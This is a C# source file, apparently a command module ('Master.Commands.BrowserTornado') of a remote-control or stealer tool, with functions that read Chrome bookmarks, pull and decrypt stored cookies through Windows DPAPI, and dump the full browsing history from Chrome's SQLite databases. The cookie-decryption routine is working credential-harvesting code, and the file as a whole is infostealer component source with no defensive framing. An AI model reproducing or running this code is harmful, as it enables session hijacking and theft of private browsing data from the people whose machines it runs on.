using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Master.Commands.BrowserTornado
{
    internal static class Chrome
    {
        #region Bookmarks
        /// <summary>
        /// Dump all bookmarks inside the given bookmarks file
        /// in the form of an IEnumerable of tuples (string name, string url)
        /// </summary>
        /// <param name="bookmarksPath">Path to the bookmarks file</param>
        /// <returns>IEnumerable of bookmarks tuples</returns>
        public static IEnumerable<Tuple<string, string>> DumpBookmarks(string bookmarksPath)
        {
            var bookmarksFileContent = File.ReadAllLines(bookmarksPath);
            var name = "";
            var url = "";

            foreach (var line in bookmarksFileContent)
            {
                if (line.Contains("\"name\":"))
                {
                    name = GetValueSubstring(line);
                }
                else if (line.Contains("\"url\":"))
                {
                    url = GetValueSubstring(line);
                }

                if (name != "" && url != "")
                {
                    yield return new Tuple<string, string>(name, url);
                    name = url = "";
                }
            }
        }

        /// <summary>
        /// Get the value part of a given line (structure of the line : "key" : "value")
        /// </summary>
        /// <param name="line">Line to be processed</param>
        /// <returns>Value part of the given line</returns>
        static string GetValueSubstring(string line)
        {
            var positions = new List<int>();
            for (int i = line.IndexOf('"'); i > -1; i = line.IndexOf('"', i + 1))
            {
                positions.Add(i);
            }

            return line.Substring(positions[2] + 1, positions[3] - positions[2] - 1);
        }
        #endregion Bookmarks

        #region Cookies
        /// <summary>
        /// Dump all cookies from the given cookie database
        /// </summary>
        /// <param name="cookiesPath">Path to the cookie database</param>
        /// <returns>All cookies in the database in the form of an IEnumerable of CookieItem</returns>
        public static IEnumerable<CookieObject> DumpCookies(string cookiesPath)
        {
            using (var connection = new SQLiteConnection("Data Source=" + cookiesPath + ";Version=3;New=False;Compress=True;"))
            {
                connection.Open();

                var query = connection.CreateCommand();
                query.CommandText = "SELECT name, host_key, encrypted_value FROM cookies;";
                var reader = query.ExecuteReader();

                while (reader.Read())
                {
                    var value = DecryptCookieValue(reader.GetValue(2));
                    yield return new CookieObject(reader.GetString(0), reader.GetString(1), value);
                }
            }
        }

        /// <summary>
        /// Decrypt the given encrypted cookie value
        /// </summary>
        /// <param name="encryptedValue">Encrypted value</param>
        /// <returns>Decrypted value</returns>
        static string DecryptCookieValue(object encryptedValue)
        {
            var decodedData = ProtectedData.Unprotect((byte[])encryptedValue, null, DataProtectionScope.CurrentUser);
            return Encoding.ASCII.GetString(decodedData);
        }
        #endregion Cookies

        /// <summary>
        /// Dump all urls from the given history database
        /// </summary>
        /// <param name="historyPath">Path to the history database</param>
        /// <returns>All urls from the history database in the form of an IEnumerable of string</returns>
        public static IEnumerable<string> DumpHistory(string historyPath)
        {
            using (var connection = new SQLiteConnection("Data Source=" + historyPath + ";Version=3;New=False;Compress=True;"))
            {
                connection.Open();

                var query = connection.CreateCommand();
                query.CommandText = "SELECT url FROM urls;";
                var reader = query.ExecuteReader();

                while (reader.Read())
                {
                    yield return reader.GetString(0);
                }
            }
        }
    }
}
